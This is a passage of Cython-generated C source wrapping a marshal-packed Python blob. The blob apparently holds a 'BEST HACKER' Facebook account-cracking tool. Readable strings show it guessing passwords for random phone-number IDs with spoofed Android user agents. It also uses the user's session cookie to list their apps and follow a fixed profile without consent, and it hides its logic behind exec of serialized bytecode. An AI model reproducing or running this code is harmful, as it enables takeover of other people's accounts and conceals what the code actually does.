static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_oo(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_oo},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "oo",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_loads, __pyx_k_loads, sizeof(__pyx_k_loads), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_marshal, __pyx_k_marshal, sizeof(__pyx_k_marshal), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_kp_b_s_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l, __pyx_k_s_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l, sizeof(__pyx_k_s_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l), 0, 0, 0, 0},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  return 0;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  /* "oo.py":6
 * 
 * import marshal
 * exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00@\x00\x00\x00s\xc8\x03\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04e\x00\xa0\x05d\x02\xa1\x01\x01\x00e\x00\xa0\x05d\x03\xa1\x01\x01\x00G\x00d\x04d\x05\x84\x00d\x05\x83\x02Z\x06d\x06Z\x07d\x07d\x08\x84\x00Z\x08d\td\n\x84\x00Z\td\x0bd\x0c\x84\x00Z\nd\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x0bZ\x0bd\x00d\x01l\x0cZ\x0cd\x00d\x01l\rZ\rd\x00d\x01l\x0eZ\x0ed\x00d\x01l\x0fZ\x0fd\x00d\x01l\x10Z\x10d\x00d\x01l\x04Z\x04e\x00\xa0\x05d\x02\xa1\x01\x01\x00d\x00d\rl\x11m\x12Z\x13\x01\x00d\x00d\rl\x11m\x12Z\x12\x01\x00d\x00d\x01l\x03Z\x14d\x00d\x0el\x15m\x16Z\x16\x01\x00d\x00d\x0fl\x15m\x15Z\x15\x01\x00d\x00d\x10l\x02m\x17Z\x17\x01\x00d\x00d\x10l\x02m\x17Z\x18\x01\x00z\x16d\x00d\x01l\x03Z\x03d\x00d\x11l\x19m\x1aZ\x1b\x01\x00d\x00d\x01l\x1cZ\x1cd\x00d\x12l\x1dm\x1eZ\x1e\x01\x00W\x00n\x13\x04\x00e\x1fy\xb1\x01\x00\x01\x00\x01\x00e\x00\xa0\x05d\x13\xa1\x01\x01\x00e\x00\xa0\x05d\x14\xa1\x01\x01\x00Y\x00n\x01w\x00d\x15d\x16\x84\x00Z d\x17d\x18\x84\x00Z!G\x00d\x19d\x05\x84\x00d\x05\x83\x02Z\x06d\x1aZ"d\x1bZ#d\x1cZ$d\x1dZ%d\x1eZ&d\x1fZ\'d\x1bZ(d\x1aZ)d Z*d!Z+d"Z,d#Z-d$Z.d%Z/d&Z0d\'Z1d(Z2d)Z3d*Z4d+Z5d,Z6d-Z7d.Z8e(e)e*e+e,e-e.e/g\x08Z9e\x0c\xa0:e9\xa1\x01Z;e\x15\xa0<\xa1\x00Z<e<\xa0=d/\xa1\x01Z>e\x15\xa0<\xa1\x00Z?e?j@ZAe?jBZCe?jDZEe\x16\xa0F\xa1\x00ZFd0Z\x07d\x00aGg\x00aHg\x00aId1d2\x84\x00ZJd\x00d3l\x02mKZL\x01\x00d\x00d4l\x00m\x05ZM\x01\x00eNeL\x83\x00d5\x19\x00\x83\x01ZOeOd6k\x04\x90\x01rCeOd6\x18\x00ZPd7ZQn\x04eOZPd8ZQz\x1aeRd9\x83\x01\x01\x00d:ZSd;ZTd;ZTeUeS\x83\x01eTv\x00\x90\x01r_e\x00\xa0\x05d2\xa1\x01\x01\x00n\x01\t\x00W\x00n\x08\x01\x00\x01\x00\x01\x00eRd<\x83\x01\x01\x00Y\x00d=d>\x84\x00ZVg\x00ZWg\x00ZXeYd?\x83\x01D\x00]`ZZd@Z[e\x0c\xa0:g\x00dA\xa2\x01\xa1\x01Z\\dBZ]e\x0c\xa0:g\x00dC\xa2\x01\xa1\x01Z^e\x0c\xa0_dDdE\xa1\x02Z`e\x0c\xa0:g\x00dC\xa2\x01\xa1\x01ZadFZbe\x0c\xa0_dGdH\xa1\x02ZcdIZde\x0c\xa0_dJdK\xa1\x02Zee\x0c\xa0_dLdM\xa1\x02ZfdNZge[\x9b\x00dOe\\\x9b\x00dPe]\x9b\x00e^\x9b\x00e`\x9b\x00ea\x9b\x00dQeb\x9b\x00ec\x9b\x00dRed\x9b\x00dRee\x9b\x00dRef\x9b\x00dOeg\x9b\x00\x9d\x13ZheX\xa0ieh\xa1\x01\x01\x00\x90\x01qvdSdT\x84\x00ZddUdV\x84\x00Zje\x08\x83\x00\x01\x00d\x01S\x00)W\xe9\x00\x00\x00\x00Nz\x08git pullz\x10pkg install curlc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00\xf3\x14\x00\x00\x00e\x00Z\x01d\x00Z\x02d\x01d\x02\x84\x00Z\x03d\x03S\x00)\x04\xda\x05jalanc\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00C\x00\x00\x00s\x04\x00\x00\x00d\x00S\x00\xa9\x01N\xa9\x00)\x02\xda\x04self\xda\x01zr\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\x06<code>\xda\x08__init__\x17\x00\x00\x00s\x02\x00\x00\x00\x04\x02\xfa\x0ejalan.__init__N\xa9\x04\xda\x08__name__\xda\n__module__\xda\x0c__qualname__r\t\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x03\x00\x00\x00\x13\x00\x00\x00s\x04\x00\x00\x00\x08\x00\x0c\x04r\x03\x00\x00\x00a\x03\x04\x00\x00   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mBEST-HACKER\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mBEST\x1b[0;m\x1b[1;32m HACKER \x1b[1;33mEDRIS\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m BEST HACKER\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mBEST-HACKER\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE BY BEST HACKER\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mBEST HACKER\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m1.0\n\x1b[1;37m================= \x1b[32;45mBEST-HACKER\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO BEST HACKER TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mAFG\x1b[0;m ======================\nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00sR\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00t\x04d\x02\x83\x01\x01\x00t\x04d\x03\x83\x01\x01\x00t\x05d\x04\x83\x01}\x00|\x00d\x05k\x02r#t\x00\xa0\x01d\x06\xa1\x01\x01\x00t\x06\x83\x00\x01\x00d\x00S\x00d\x00d\x07\x83\x01\x01\x00d\x00S\x00)\x08N\xda\x05clearz" [1] SUBSCRIBE CHANNEL BEST HACKER\xfa\t [2] EXITz\x16\n   Choose option >>> \xda\x011z/xdg-open https://youtube.com/c/BestHacker004200\xfa\x13\n\x1b[1;31mEXIT\x1b[0;97m)\x07\xda\x02os\xda\x06systemr\x03\x00\x00\x00\xda\x04logo\xda\x05print\xda\x05input\xda\x02FD\xa9\x01Z\x03optr\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x02ud\x1d\x00\x00\x00\xf3\x14\x00\x00\x00\n\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\n\x02\x06\x02\x04\x02\x0c\x02r\x1a\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00sR\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00t\x02d\x02\x83\x01\x01\x00t\x02d\x03\x83\x01\x01\x00t\x04d\x04\x83\x01}\x00|\x00d\x05k\x02r#t\x00\xa0\x01d\x06\xa1\x01\x01\x00t\x05\x83\x00\x01\x00d\x00S\x00d\x00d\x07\x83\x01\x01\x00d\x00S\x00)\x08Nr\x0f\x00\x00\x00z#\x1b[1;33m [1] JOINED TELEGRAM CHANNELr\x10\x00\x00\x00z\x1d\n  \x1b[1;32m Choose option >>> r\x11\x00\x00\x00z&xdg-open https://t.me/Best_Hacker00420r\x12\x00\x00\x00)\x06r\x13\x00\x00\x00r\x14\x00\x00\x00r\x16\x00\x00\x00r\x15\x00\x00\x00r\x17\x00\x00\x00\xda\x01or\x19\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x18\x00\x00\x003\x00\x00\x00r\x1b\x00\x00\x00r\x18\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\xa6\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00t\x02d\x02\x83\x01\x01\x00t\x04d\x03\x83\x01\x01\x00t\x02d\x04\x83\x01\x01\x00t\x02d\x05\x83\x01\x01\x00t\x02d\x06\x83\x01\x01\x00t\x02d\x07\x83\x01\x01\x00t\x05d\x08\x83\x01}\x00|\x00d\tk\x02r,t\x06\x83\x00\x01\x00d\x00d\nk\x02r7t\x00\xa0\x01d\x0b\xa1\x01\x01\x00d\x00S\x00d\x00d\x0ck\x02rBt\x00\xa0\x01d\r\xa1\x01\x01\x00d\x00S\x00d\x00d\x0ek\x02rMt\x00\xa0\x01d\x0f\xa1\x01\x01\x00d\x00S\x00d\x00d\x10\x83\x01\x01\x00d\x00S\x00)\x11Nr\x0f\x00\x00\x00u$\x00\x00\x00\t\xf0\x9f\x94\xa5\xf0\x9f\x94\xa5RANDOM NUMBER CRACK\xf0\x9f\x94\xa5\xf0\x9f\x94\xa5\xda\x00z \x1b[1;32m [1]\x1b[1;33m RANDOM CRACK z \x1b[1;32m [2] \x1b[1;32mJOIN TELEGRAMz\x1f \x1b[1;32m[3] \x1b[1;32mJOIN FB PAGEz\x18 \x1b[1;32m[00] \x1b[1;31mEXITz\x1e\n   \x1b[1;32m Choose option >>> r\x11\x00\x00\x00\xda\x012z\x1exdg-open t.me/Best_Hacker00420\xda\x013z2xdg-open https://www.facebook.com/Best_hacker00420\xda\x010\xda\x04exitz$\n\x1b[1;31m  Choose valid option\x1b[0;97m)\x07r\x13\x00\x00\x00r\x14\x00\x00\x00r\x03\x00\x00\x00r\x15\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\xda\x01ir\x19\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x1c\x00\x00\x00I\x00\x00\x00s*\x00\x00\x00\n\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x06\x02\x08\x02\n\x02\x04\x02\x08\x02\n\x02\x04\x04\x08\x02\n\x02\x04\x02\x0c\x02r\x1c\x00\x00\x00)\x01\xda\rBeautifulSoup)\x01\xda\x04date)\x01\xda\x08datetime)\x01\xda\x05sleep)\x01\xda\x12ThreadPoolExecutor)\x01\xda\x0fConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullz\x0fpip install bs4c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\t\x00\x00\x00C\x00\x00\x00sf\x01\x00\x00|\x00j\x00d\x01d\x02|\x01i\x01d\x03\x8d\x02j\x01}\x02t\x02|\x02d\x04\x83\x02}\x03|\x03j\x03d\x05d\x06d\x07\x8d\x02}\x04d\x08d\t\x84\x00|\x04\xa0\x04d\n\xa1\x01D\x00\x83\x01}\x05t\x05|\x05\x83\x01d\x0bk\x02r2t\x06d\x0ct\x07t\x08t\x07t\x08t\x07f\x05\x16\x00\x83\x01\x01\x00n$t\x06d\rt\t\x9b\x00\x9d\x02t\n\x16\x00\x83\x01\x01\x00t\x0bt\x05|\x05\x83\x01\x83\x01D\x00]\x14}\x06t\x06d\x0et\x07|\x06d\x0f\x17\x00|\x05|\x06\x19\x00\xa0\x0cd\x10d\x11\xa1\x02t\x07f\x04\x16\x00\x83\x01\x01\x00qA|\x00j\x00d\x12d\x02|\x01i\x01d\x03\x8d\x02j\x01}\x02t\x02|\x02d\x04\x83\x02}\x03|\x03j\x03d\x05d\x06d\x07\x8d\x02}\x04d\x13d\t\x84\x00|\x04\xa0\x04d\n\xa1\x01D\x00\x83\x01}\x05t\x05|\x05\x83\x01d\x0bk\x02r\x89t\x06d\x14t\x07t\x08t\x07t\x08t\x07f\x05\x16\x00\x83\x01\x01\x00d\x00S\x00t\x06d\x15t\t\x9b\x00\x9d\x02t\x08\x16\x00\x83\x01\x01\x00t\x0bt\x05|\x05\x83\x01\x83\x01D\x00]\x14}\x06t\x06d\x0et\x07|\x06d\x0f\x17\x00|\x05|\x06\x19\x00\xa0\x0cd\x16d\x17\xa1\x02t\x07f\x04\x16\x00\x83\x01\x01\x00q\x98t\x06d\x18\x83\x01\x01\x00d\x00S\x00)\x19Nz:https://free.facebook.com/settings/apps/tabbed/?tab=active\xda\x06cookie\xa9\x01\xda\x07cookies\xfa\x0bhtml.parserZ\x04form\xda\x04post)\x01\xda\x06methodc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00S\x00\x00\x00\xf3\x12\x00\x00\x00g\x00|\x00]\x05}\x01|\x01j\x00\x91\x02q\x02S\x00r\x05\x00\x00\x00\xa9\x01\xda\x04text\xa9\x02\xda\x02.0r"\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\n<listcomp>\xa3\x00\x00\x00\xf3\x02\x00\x00\x00\x12\x00z\x1bcek_apk.<locals>.<listcomp>Z\x02h3r\x01\x00\x00\x00z.\r%s[%s!%s] %sSorry there is no Active  Apk%s  u1\x00\x00\x00\r[\xf0\x9f\x8e\xae] %s \x1b[1;95m \xe2\x98\x86 Your Active Apps \xe2\x98\x86     :z\x0c\r[%s%s] %s%s\xe9\x01\x00\x00\x00z\x10Ditambahkan padaz\x11 Ditambahkan padaz<https://free.facebook.com/settings/apps/tabbed/?tab=inactivec\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00S\x00\x00\x00r/\x00\x00\x00r\x05\x00\x00\x00r0\x00\x00\x00r2\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r4\x00\x00\x00\xbb\x00\x00\x00r5\x00\x00\x00z8\r%s[%s!%s] %sSorry there is no Expired Apk%s           \nu1\x00\x00\x00\r[\xf0\x9f\x8e\xae] %s \x1b[1;95m \xe2\x97\x87 Your Expired Apps \xe2\x97\x87    :Z\x0bKedaluwarsaz\x0c Kedaluwarsar\x1d\x00\x00\x00)\r\xda\x03getr1\x00\x00\x00r#\x00\x00\x00\xda\x04findZ\x08find_all\xda\x03lenr\x16\x00\x00\x00\xda\x01N\xda\x01M\xda\x05WHITE\xda\x05GREEN\xda\x05range\xda\x07replace)\x07\xda\x07session\xda\x04coki\xda\x01w\xda\x03sop\xda\x01xZ\x04gamer"\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x07cek_apk\x9b\x00\x00\x00s&\x00\x00\x00\x14\x02\n\x02\x0e\x02\x14\x02\x0c\x02\x18\x02\x12\x04\x10\x02&\x02\x14\x06\n\x02\x0e\x02\x14\x02\x0c\x02\x1a\x02\x12\x04\x10\x02&\x02\x0c\x04rE\x00\x00\x00c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\\\x00\x00\x00t\x00|\x01j\x01d\x01d\x02|\x02i\x01f\x02i\x00d\x03\xa4\x01\x8e\x01j\x02d\x04\x83\x02}\x03|\x03j\x03d\ni\x00d\x07\xa4\x01\x8e\x01\xa0\x01d\x08\xa1\x01}\x04|\x01j\x01d\tt\x04|\x04\x83\x01\x17\x00d\x02|\x02i\x01f\x02i\x00d\x03\xa4\x01\x8e\x01j\x02\x01\x00d\x00S\x00)\x0bNz8https://free.facebook.com/profile.php?id=100015315258519r)\x00\x00\x00r*\x00\x00\x00r,\x00\x00\x00\xda\x01a\xda\x05Ikuti)\x01\xda\x06stringZ\x04href\xfa\x19https://free.facebook.com)\x02rF\x00\x00\x00rG\x00\x00\x00)\x05r#\x00\x00\x00r7\x00\x00\x00r1\x00\x00\x00r8\x00\x00\x00\xda\x03str)\x05r\x06\x00\x00\x00r@\x00\x00\x00rA\x00\x00\x00\xda\x01rr7\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x06follow\xcf\x00\x00\x00s\x1c\x00\x00\x00\x08\x02\x04\x02\x06\xfe\x02\x02\x04\xfe\x04\x02\x04\xfe\x16\x04\x0e\x02\x04\x02\x06\xfe\x02\x02\x04\xfe\x08\x02rL\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00r\x02\x00\x00\x00)\x04r\x03\x00\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s2\x00\x00\x00|\x01d\x01\x17\x00D\x00]\x12}\x02t\x00j\x01\xa0\x02|\x02\xa1\x01\x01\x00t\x00j\x01\xa0\x03\xa1\x00\x01\x00t\x04\xa0\x05d\x02\xa1\x01\x01\x00q\x04d\x00S\x00)\x03N\xda\x01\ng;\xdfO\x8d\x97n\x82?)\x06\xda\x03sys\xda\x06stdout\xda\x05write\xda\x05flush\xda\x04timer&\x00\x00\x00)\x03r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x01er\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xe3\x00\x00\x00s\n\x00\x00\x00\x0c\x02\x0c\x02\n\x02\x0c\x02\x04\xfar\n\x00\x00\x00Nr\x0b\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x03\x00\x00\x00\xe1\x00\x00\x00s\x04\x00\x00\x00\x08\x00\x0c\x02z\x07\x1b[1;91mz\x07\x1b[1;97mz\x07\x1b[1;32mz\x07\x1b[1;33mz\x07\x1b[1;34mz\x07\x1b[1;35mz\x07\x1b[1;92mz\x07\x1b[1;93mz\x07\x1b[1;94mz\x07\x1b[1;95mz\x07\x1b[1;96mz\x04\x1b[0mz\x07\x1b[1;90mz\x08\x1b[1;107mz\x08\x1b[1;106mz\x08\x1b[1;105mz\x08\x1b[1;104mz\x08\x1b[1;103mz\x08\x1b[1;102mz\x08\x1b[1;101mz\x08\x1b[1;100mz\x05%H:%Ma\x94\x06\x00\x00   \n\n\x1b[1;32m       BBBBBBBBBBBBBBBBB       HHHHHHHH       HHHHHHHH\n\n\x1b[1;35m       B::::::::::::::::B      H::::::H        H::::::H\n\n\x1b[1;35m       B::::::BBBBBB:::::B     H::::::H        H::::::H\n\n\x1b[1;32m       B:::::B     B:::::B     H::::::H        H::::::H\n\n\x1b[1;32m       B::::B       B:::::B    HHHHHHHH        HHHHHHHH\n\n\x1b[1;35m       B::::B      B:::::B     HHHHHHHH        HHHHHHHH\n\n\x1b[1;35m       B::::BBBBBB:::::B       H::::::H HHHHHH H::::::H\n\n\x1b[1;32m       B:::::::::::::BB        H::::::H HHHHHH H::::::H\n\n\x1b[1;32m       B::::BBBBBB:::::B       H::::::H HHHHHH H::::::H\n\n\x1b[1;35m       B::::B      B:::::B     H::::::H        H::::::H\n\n\x1b[1;35m       B::::B       B:::::B    H::::::H        H::::::H\n\n\x1b[1;32m       B::::B      B:::::B     H::::::H        H::::::H\n\n\x1b[1;32m       BB:::::BBBBBB::::::B    H::::::H        H::::::H\n\n\x1b[1;35m       B:::::::::::::::::B     H::::::H        H::::::H\n\n\x1b[1;35m       B::::::::::::::::B      H::::::H        H::::::H\n\n\x1b[1;32m       BBBBBBBBBBBBBBBBB       HHHHHHHH        HHHHHHHH   \n\n \n\n\x1b[1;37m================= \x1b[32;45mBEST Hacker\x1b[0;m =====================\n\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mBEST\x1b[0;m\x1b[1;32m HACKER \x1b[1;33mEDRIS NABIZADA\x1b[0;m\n\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m BEST HACKER\n\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM BEST HACKER\n\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE BY BEST HACKER\n\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mBEST HACKER\n\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m1.0\n\n\x1b[1;37m================= \x1b[32;45mBEST\x1b[0;m =====================\n\n \n\n       \x1b[37;41m\t WELLCOME TO BEST HACKER TOOL\x1b[0;m\n\n \n\n\x1b[1;37m================== \x1b[32;45mAFG\x1b[0;m ======================\nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00d\x00S\x00)\x02Nr\x0f\x00\x00\x00)\x04r\x13\x00\x00\x00r\x14\x00\x00\x00r\x16\x00\x00\x00r\x15\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x0f\x00\x00\x00u\x01\x00\x00s\x04\x00\x00\x00\n\x02\x0c\x02r\x0f\x00\x00\x00)\x01\xda\tlocaltime)\x01r\x14\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0c\x00\x00\x00Z\x02PMZ\x02AMz(\n\n\x1b[1;33mLoading asset files ... \x1b[0;97mg\xcd\xcc\xcc\xcc\xcc\xcc\x14@z\x035.2z*\n\x1b[1;31mNo internet connection ... \x1b[0;97mc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s<\x00\x00\x00g\x00d\x01\xa2\x01}\x01|\x01D\x00]\x15}\x02t\x00d\x02|\x00\x17\x00|\x02\x17\x00\x83\x01f\x01\x01\x00t\x01j\x02\xa0\x03\xa1\x00\x01\x00t\x04\xa0\x05d\x03\xa1\x01\x01\x00q\x06d\x00S\x00)\x04N)\x04z\x04.   z\x04..  z\x04... z\x05.... \xfa\x01\rr6\x00\x00\x00)\x06r\x16\x00\x00\x00rN\x00\x00\x00rO\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r&\x00\x00\x00)\x03r1\x00\x00\x00Z\x05titikr\x1c\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x07dynamic\xa5\x01\x00\x00s\n\x00\x00\x00\x08\x02\x08\x02\x12\x02\x16\x02\x04\xfcrX\x00\x00\x00i\x10\'\x00\x00z\x1eMozilla/5.0 (Linux; U; Android)\x0fr\x1f\x00\x00\x00\xda\x014\xda\x015\xda\x016\xda\x017\xda\x018\xda\x019Z\x0210Z\x0211Z\x0212Z\x0213Z\x0214Z\x0215Z\x0216Z\x0217z\x0b en-us; GT-)\x1a\xda\x01A\xda\x01B\xda\x01C\xda\x01D\xda\x01E\xda\x01F\xda\x01G\xda\x01H\xda\x01I\xda\x01J\xda\x01K\xda\x01Lr;\x00\x00\x00r:\x00\x00\x00\xda\x01O\xda\x01P\xda\x01Q\xda\x01R\xda\x01S\xda\x01T\xda\x01U\xda\x01V\xda\x01W\xda\x01X\xda\x01Y\xda\x01Zr6\x00\x00\x00i\xe7\x03\x00\x00z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/\xe9I\x00\x00\x00\xe9d\x00\x00\x00r \x00\x00\x00ih\x10\x00\x00i$\x13\x00\x00\xe9(\x00\x00\x00\xe9\x96\x00\x00\x00z\x13Mobile Edris/537.36\xfa\x01 z\x02; z\x02) \xda\x01.c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x08\x00\x00\x00C\x00\x00\x00s\xcc\x01\x00\x00g\x00}\x00g\x00}\x01t\x00j\x01\x01\x00t\x00j\x02\x01\x00t\x00\xa0\x03d\x01\xa1\x01\x01\x00t\x04t\x05\x83\x01\x01\x00t\x04d\x02\x83\x01\x01\x00t\x04d\x03\x83\x01\x01\x00t\x04d\x04\x83\x01\x01\x00t\x04d\x05\x83\x01\x01\x00t\x04d\x04\x83\x01\x01\x00t\x04d\x06\x83\x01\x01\x00t\x04d\x07\x83\x01\x01\x00t\x04d\x08\x83\x01\x01\x00t\x04d\x07\x83\x01\x01\x00t\x06d\t\x83\x01}\x02t\x07d\n\x83\x01\x01\x00t\x08t\x06d\x0b\x83\x01\x83\x01}\x03t\t|\x03\x83\x01D\x00]\x13}\x04d\n\xa0\nd\x0cd\r\x84\x00t\td\x0e\x83\x01D\x00\x83\x01\xa1\x01}\x05|\x00\xa0\x0b|\x05\xa1\x01\x01\x00qIt\x00\xa0\x03d\x01\xa1\x01\x01\x00t\x07t\x05\x83\x01\x01\x00t\x08t\x06d\x0f\x83\x01\x83\x01}\x06g\x00}\x07t\x07d\n\x83\x01\x01\x00t\t|\x06\x83\x01D\x00]\x0b}\x08t\x06d\x10\x83\x01}\t|\x07\xa0\x0b|\t\xa1\x01\x01\x00qvt\x0cd\x11d\x12\x8d\x01\x8fE}\nt\r\x83\x00\x01\x00t\x0et\x0f|\x00\x83\x01\x83\x01}\x0bt\x07d\x13|\x0b\x17\x00\x83\x01\x01\x00t\x07d\x14\x83\x01\x01\x00t\x07d\x15\x83\x01\x01\x00t\x07d\x04\x83\x01\x01\x00|\x00D\x00]\x1f}\x0c|\x0cd\x16d\x00\x85\x02\x19\x00g\x01}\r|\x02|\x0c\x17\x00}\x0e|\x07D\x00]\x07}\x0f|\r\xa0\x0b|\x0f\xa1\x01\x01\x00q\xb4|\n\xa0\x10t\x11|\x0e|\r|\x0b\xa1\x04\x01\x00q\xa5W\x00d\x00\x04\x00\x04\x00\x83\x03\x01\x00n\x081\x00s\xcfw\x01\x01\x00\x01\x00